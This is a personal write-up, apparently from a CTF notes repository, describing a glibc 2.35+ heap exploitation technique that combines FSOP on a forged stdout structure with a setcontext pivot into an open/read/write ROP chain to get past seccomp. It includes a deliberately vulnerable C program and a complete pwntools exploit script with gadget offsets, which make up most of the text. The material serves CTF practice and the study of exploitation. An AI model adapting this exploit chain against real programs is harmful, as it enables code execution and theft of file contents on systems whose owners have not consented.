# Glibc `2.35+` heap + seccomp exploitation technique using ROP + ???

I assume that you already read lkmidas's blog. In here i just want a post to note how to handle seccomp heap in higher glibc version - when `_hook` has been removed. 

I come up with an idea, using FSOP (with rce paths i already note in [here](/fsop/io_paths/readme.md)), and yeah it works. I wont write details here, because it just simply combine 2 techniques (which i explained before). Here is poc:

<details>
<summary><strong>POC</strong></summary>
<p>

C vuln code (compile with `glibc 2.39`):

```bash
gcc -Xlinker -rpath=$HOME/glibc-2.39/compiled-2.39/lib/ -Xlinker -I$HOME/glibc-2.39/compiled-2.39/lib/ld-linux-x86-64.so.2 tmp.c -o tmp
```

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);

    long *ptr;
    ptr = malloc(0x168);
    printf("heap leak: %p\n", ptr);

    printf("libc leak: %p\n", stdout);

    puts("rop chain:");
    read(0, ptr, 0x168);

    puts("attack stdout:");
    read(0, stdout, 0xE0);

    puts("trigger");

    return 0;
}
```

Exploit code:

```python
from pwn import *

# https://lkmidas.github.io/posts/20210103-heap-seccomp-rop/
# becareful the rdi and rsp value in midas payload
# attention the rdi and [rdi + 8] when execute add_rdi_0x10_jmp_rcx

script = '''
b *main
b *main + 240
'''

libc = ELF("/home/vani/glibc-2.39/compiled-2.39/lib/libc.so.6")

p = process("./tmp")
#p = gdb.debug("./tmp", gdbscript = script)

# leak heap and libc
p.recvuntil(b"heap leak: ")
heap_base = int(p.recvline(), 16) - 0x2a0
print(hex(heap_base))

p.recvuntil(b"libc leak: ")
libc_base = int(p.recvline(), 16) - libc.symbols['_IO_2_1_stdout_'] 
print(hex(libc_base))

# using ROPgadget
pop_rdi = libc_base + 0x0000000000026552
pop_rsi = libc_base + 0x0000000000027e51
pop_rdx_r12 = libc_base + 0x00000000000fa217
pop_rax = libc_base + 0x000000000003e503
xchg_rdi_rax_cld = libc_base + 0x0000000000162721

# using this command
'''
objdump -D -Mintel /home/vani/glibc-2.39/compiled-2.39/lib/libc.so.6 | grep -B 1 ret | grep -A 1 syscall
'''
syscall_ret = libc_base + 0x81746

# using ROPgadget but becareful the "[" regular expressions
# 0x000000000013e5c0 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
call_gadget = libc_base + 0x000000000013e5c0

# using pwndbg
'''
x/20i setcontext
'''
setcontext_gadget = libc_base + 0x3fa2d

# payload from lkmidas's blog
heap = heap_base
base = heap + 0x2a0               # payload_base (address of the chunk)
payload = b"A"*8                  # <-- [rdi] <-- payload_base
payload += p64(base)              # <-- [rdi + 8] = rdx
payload += b"B"*0x10              # padding
payload += p64(setcontext_gadget) # <-- [rdx + 0x20]

payload += p64(0)                 # <-- [rdx + 0x28] = r8
payload += p64(0)                 # <-- [rdx + 0x30] = r9
payload += b"A"*0x10              # padding
payload += p64(0)                 # <-- [rdx + 0x48] = r12
payload += p64(0)                 # <-- [rdx + 0x50] = r13
payload += p64(0)                 # <-- [rdx + 0x58] = r14
payload += p64(0)                 # <-- [rdx + 0x60] = r15
payload += p64(base + 0x158)      # <-- [rdx + 0x68] = rdi (ptr to flag path)
payload += p64(0)                 # <-- [rdx + 0x70] = rsi (flag = O_RDONLY)
payload += p64(0)                 # <-- [rdx + 0x78] = rbp
payload += p64(0)                 # <-- [rdx + 0x80] = rbx
payload += p64(0)                 # <-- [rdx + 0x88] = rdx 
payload += b"A"*8                 # padding
payload += p64(0)                 # <-- [rdx + 0x98] = rcx 
payload += p64(base + 0xa0)      # <-- [rdx + 0xa0] = rsp, perfectly setup for it to ret into our chain
payload += p64(pop_rax)           # <-- [rdx + 0xa8] = rcx, will be pushed to rsp

payload += p64(2)
payload += p64(syscall_ret) # sys_open("/path/to/flag", O_RDONLY)
payload += p64(xchg_rdi_rax_cld)
payload += p64(pop_rsi)
payload += p64(heap + 0x2000) # destination buffer, can be anywhere readable and writable
payload += p64(pop_rdx_r12)
payload += p64(0x100) + p64(0) # nbytes
payload += p64(pop_rax)
payload += p64(0)
payload += p64(syscall_ret) # sys_read(eax, heap + 0x2000, 0x100)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(heap + 0x2000) # buffer
payload += p64(pop_rdx_r12)
payload += p64(0x100) + p64(0) # nbytes
payload += p64(pop_rax)
payload += p64(1)
payload += p64(syscall_ret) # sys_write(1, heap + 0x2000, 0x100)
payload += b"./flag.txt"
p.sendafter(b"rop chain:", payload)

# payload from fsop an3eii note
# just change the gadget
add_rdi_0x10_jmp_rcx = libc_base + 0x000000000013b0d0
_IO_stdfile_1_lock = libc_base + libc.symbols['_IO_stdfile_1_lock']
_IO_2_1_stdout_ = libc_base + libc.symbols['_IO_2_1_stdout_']
fake_vtable = libc_base + libc.symbols['_IO_wfile_jumps'] - 0x18

fake_stdout = [p64(0x3b01010101010101), # _flags
               p64(0),
               p64(call_gadget), # _IO_read_end
               p64(0) * 3,
               p64(0), # _IO_write_end
               p64(base), # [rdi + 8]
               p64(0),
               p64(add_rdi_0x10_jmp_rcx), # _IO_save_base
               p64(0) * 7,
               p64(_IO_stdfile_1_lock), # _lock
               p64(0),
               p64(_IO_2_1_stdout_ + 0xb8), # _codecvt
               p64(_IO_2_1_stdout_ + 0x200), # _wide_data
               p64(0) * 2 + p64(_IO_2_1_stdout_ + 0x20) + p64(0) * 3, # padding the __pad5
               p64(fake_vtable) # vtable
               ]
payload = b"".join(fake_stdout)
p.sendafter(b"attack stdout:", payload)

p.interactive()
```

</p>
</details>

You should change the offset calculated to adapt with your libc versions and local setting. I know it not clean looking but here is just my poc and note for me to reuse or refresh later.

You should flexible, there is many way to achieve seccomp bypass, not only via `_hook` or FSOP, eg libc got entries, leak `__environ` + stack ROP

Also there is very cool blogs, combine largebin attack + FSOP (`_IO_list_all`) + pivot ROP to bypass seccomp, you can find it here:

- https://4xura.com/pwn/pwn-travelgraph/